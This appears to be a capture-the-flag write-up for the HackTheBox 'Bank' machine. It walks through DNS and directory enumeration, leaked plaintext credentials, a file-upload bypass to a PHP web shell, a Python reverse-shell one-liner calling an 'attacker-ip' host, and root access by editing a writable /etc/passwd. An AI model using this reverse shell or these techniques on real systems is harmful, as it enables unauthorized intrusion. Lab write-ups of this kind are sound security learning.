Bank is a medium-difficulty machine that involves domain enumeration, bypassing file upload restrictions to gain shell access, and escalating privileges by modifying a writable system file. This writeup details each step taken to fully compromise the machine.

## Enumeration

We begin with an Nmap scan to identify open ports and services:

```nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-04 01:10 EST
Nmap scan report for 10.10.10.29
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)

```
The scan reveals three open ports:
- **Port 22**: SSH (OpenSSH 6.6.1p1)
- **Port 53**: DNS (ISC BIND 9.9.5-3ubuntu0.14)
- **Port 80**: HTTP (Apache httpd 2.4.7)

The HTTP service displays the default Apache landing page, indicating that further enumeration is required.

### DNS Enumeration

Since **port 53 (DNS)** is open, we attempt a **zone transfer** using `dig`:

![dig](/assets/ctf/htb_media/bankdig.png)

This reveals several subdomains:

- **bank.htb**
- **[www.bank.htb](http://www.bank.htb/)**
- **chris.bank.htb**
- **ns.bank.htb**

Adding these subdomains to the `/etc/hosts` file allows us to explore them further. While most subdomains redirect to the default Apache page, `bank.htb` leads to a login page.

![login](/assets/ctf/htb_media/banklogin.png)

After testing default credentials and SQL injection, no vulnerabilities are found. 

### Directory Enumeration

Using `ffuf`, we perform directory enumeration on `bank.htb`:

![dirscan](/assets/ctf/htb_media/bankdirscan.png)

This uncovers a directory named `balance-transfer`, which contains `.acc` files. One of these files, smaller in size, contains plaintext credentials for the user `chris`:

```

```

## Gaining shell

### Exploiting the File Upload Feature

Using the credentials `chris:!##HTBB4nkP4ssw0rd!##`, we log in and discover a ticket system (`support.php`) that allows file uploads. Attempting to upload a PHP shell fails due to MIME type restrictions. However, by crafting a file with a PNG MIME type and PHP content, we successfully upload the file. Despite this, the file is not executed due to the `.png` extension.

![fileupload](/assets/ctf/htb_media/bankfileupload.png)

Upon inspecting the source code, we find a debug comment:

`<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->`

This indicates that files with the `.htb` extension are executed as PHP. We create a payload with the `.htb` extension and upload it. Accessing `bank.htb/uploads/test.htb` provides a web shell as the `www-data` user.

![wwwshell](/assets/ctf/htb_media/bankwwwshell.png)

### Establishing a Reverse Shell

Using the web shell, we establish a reverse shell to our attacker machine:

```python3
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

The user flag is located in Chris's home directory:

![user](/assets/ctf/htb_media/bankuser.png)

## Privilege Escalation

### Exploiting a Writable `/etc/passwd` File

During enumeration, we discover that the `/etc/passwd` file is writable:

![passwd](/assets/ctf/htb_media/bankpasswd.png)

We add a new user with root privileges by appending the following line to `/etc/passwd`:

![root](/assets/ctf/htb_media/bankroot.png)

## Conclusion

The Bank machine emphasizes the significance of secure file upload handling and proper input validation. By exploiting a file upload vulnerability and misconfigured file extension handling, we gained a foothold on the system. Privilege escalation was achieved through writable sensitive files, demonstrating the importance of enforcing least privilege and monitoring for misconfigurations to enhance security.
